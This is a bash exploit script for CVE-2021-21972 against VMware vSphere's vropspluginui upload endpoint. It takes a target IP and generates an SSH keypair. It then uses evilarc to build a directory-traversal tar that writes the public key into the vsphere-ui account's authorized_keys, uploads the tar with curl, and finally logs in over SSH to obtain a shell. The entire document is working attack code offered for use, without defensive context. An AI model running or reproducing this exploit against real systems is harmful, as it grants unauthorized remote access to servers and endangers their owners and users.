#!/bin/bash

#Prerequisites:
# Download the evilarc.py script from https://github.com/ptoomey3/evilarc and place it in the same directory as this script.

#Automated Steps:
#	1. Create SSH Keypair
#	2. Add your public key into directory traversal archive w/ evilarc
#	3. Send request to vSphere to add you ssh key to the authorized_keys directory (it will create one if one does not exists)

echo "
_____________   _______________         _______________   ________  ____          ________  ____ _________________________  
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \/_   |         \_____  \/_   /   __   \______  \_____  \ 
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ |   |  ______  /  ____/ |   \____    /   /    //  ____/ 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \ |   | /_____/ /       \ |   |  /    /   /    //       \ 
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \|___|         \_______ \|___| /____/   /____/ \_______ \
        \/                  \/                  \/     \/         \/                      \/                              \/"
		
echo ""
echo "written by @PettyHacks"
echo "---------------------------------------------------------------------------------------------------------------------------------------"
echo ""
echo "Enter Target IP:"

read IP
URL="https://${IP}/ui/vropspluginui/rest/services/uploadova"

echo "Target: $URL"
echo ""
#Step 1
echo "Will now generate ssh keys in the current working directory..."
pwd	

ssh-keygen -t rsa -f "21972-key" -P "" > /dev/null 2>&1	

echo ""
mv 21972-key.pub authorized_keys
chmod 600 21972-key

#Step 2
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar authorized_keys > /dev/null 2>&1

#Step 3
echo ""
echo "Ready to yeet payload at target. Press any key to continue:"
read blah
curl -k --form "uploadFile=@linexpl.tar" $URL
echo ""
echo ""
echo "Done!"

#Step 4
echo ""
echo "Popping of shell commencing"
echo "Press any key to continue"
read bleh
ssh -i 21972-key vsphere-ui@$IP
